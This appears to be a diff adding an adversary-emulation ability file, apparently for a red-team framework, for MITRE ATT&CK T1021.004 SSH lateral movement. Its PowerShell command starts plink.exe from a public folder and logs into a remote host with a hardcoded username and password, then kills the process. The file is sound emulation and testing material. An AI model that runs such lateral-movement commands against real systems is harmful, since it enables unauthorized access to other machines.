@@ -1,0 +1,37 @@
+- tactic: lateral-movement
+  technique_name: 'Remote Services: SSH'
+  technique_id: T1021.004
+  name: 'Application: Plink over SSH'
+  description: Adversaries may exploit Valid Accounts to log into remote machines
+    via Secure Shell (SSH), enabling them to perform actions as the logged-on user.
+    SSH, a protocol for remote shell access, is commonly installed on Linux and macOS
+    systems but often disabled by default. Adversaries can leverage standard password
+    authentication or public-private key-pairs, placing the user's public key in the
+    server's authorized keys file to gain access without raising suspicion.
+  executors:
+  - name: psh
+    platform: windows
+    command: '$plinkProcess = Start-Process -FilePath C:\Users\Public\plink.exe -ArgumentList
+      "-ssh 198.18.133.49 -l sysadmin -pw C1sco12345" -NoNewWindow -PassThru; Start-Sleep
+      -Seconds 5; $plinkProcess.Kill() '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 10
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 7e55db5a-836c-4b47-8c74-a43db9df9c01
